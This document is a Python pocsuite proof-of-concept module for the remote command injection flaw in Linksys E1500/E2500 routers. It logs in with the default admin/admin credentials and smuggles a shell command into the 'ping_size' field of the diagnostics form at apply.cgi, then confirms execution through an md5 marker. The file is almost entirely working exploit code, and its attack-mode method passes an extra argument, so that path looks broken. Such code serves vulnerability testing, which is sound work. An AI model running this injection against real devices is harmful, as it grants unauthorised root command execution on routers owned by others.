#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
import random
import hashlib
import string

class TestPOC(POCBase):
    name = "Linksys E1500/E2500"
    vulID = ''
    author = ['sebao']
    vulType = 'Code excution'
    version = '1.0'  # default version: 1.0
    references = 'https://www.exploit-db.com/exploits/24475/'
    desc = 'Module exploits remote command execution in Linksys E1500/E2500 devices.Diagnostics interface allows executing root privileged shell commands is available on dedicated web pages on the device.'


    vulDate = ''
    createDate = '2017-10-18'
    updateDate = '2017-10-18'

    appName = 'Linksys'
    appVersion = 'Linksys E1500/E2500'
    dork = ''
    appPowerLink = 'http://www.Linksys.com'
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = "{}/apply.cgi".format(self.url)
        mark = ''.join(random.sample(string.ascii_letters + string.digits, 12))
        md5 = hashlib.md5()
        md5.update(mark)
        md5hash = md5.hexdigest()
        cmd = "echo -n {}|md5sum".format(mark)
        username = 'admin'
        password = 'admin'

        data = {
            "submit_button":
                "Diagnostics",
            "change_action": "gozila_cgi",
            "submit_type": "start_ping",
            "action": "",
            "commit": "0",
            "ping_ip": "127.0.0.1",
            "ping_size": "&" + cmd,
            "ping_times": "5",
            "traceroute_ip": "127.0.0.1"
        }

        resp = req.post(url, data=data,auth=(username,password), timeout=10)
        if md5hash in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
